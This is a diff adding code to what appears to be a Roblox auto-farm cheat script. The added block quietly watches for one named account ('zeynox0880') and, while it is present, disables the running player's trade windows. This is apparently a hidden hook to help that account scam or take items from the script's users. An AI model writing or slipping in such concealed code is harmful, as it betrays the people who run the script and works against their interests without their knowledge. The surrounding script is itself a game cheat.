@@ -200,3 +200,30 @@ FarmButton.MouseButton1Click:Connect(function()
         FarmButton.Text = "START AUTO FARM"
     end
 end)
+
+-- [[ DÉTECTION SPÉCIALE JOUEUR & GUI INTERFACE ]] --
+task.spawn(function()
+    while true do
+        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
+        if playerGui then
+            -- Recherche si la cible est présente
+            local targetFound = false
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p.Name == "zeynox0880" then
+                    targetFound = true
+                    break
+                end
+            end
+            
+            if targetFound then
+                -- Cacher les GUI du PlayerGui si le joueur est détecté
+                local gui1 = playerGui:FindFirstChild("TradeGUI_Phone")
+                local gui2 = playerGui:FindFirstChild("TradeGUI")
+                
+                if gui1 and gui1:IsA("ScreenGui") then gui1.Enabled = false end
+                if gui2 and gui2:IsA("ScreenGui") then gui2.Enabled = false end
+            end
+        end
+        task.wait(1) -- Vérification douce toutes les secondes pour éviter les lags
+    end
+end)
